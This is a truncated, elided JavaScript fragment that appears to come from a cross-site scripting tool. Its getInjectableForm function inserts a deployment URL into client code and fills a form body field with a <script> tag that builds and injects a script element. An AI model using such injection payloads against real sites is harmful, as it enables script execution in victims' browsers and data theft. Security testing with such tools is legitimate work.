...
function getInjectableForm() {
  ...
  clientCode = clientCode
    ...
    .replace("$DEPLOYMENT_URL$", DEPLOYMENT_URL);
  ...
  bodyAreaField.defaultValue =
    "<script>var script = document.createElement('script');script.setAttribute('type', 'text/javascript');script.appendChild(document.createTextNode(\"" +
    scriptToInject +
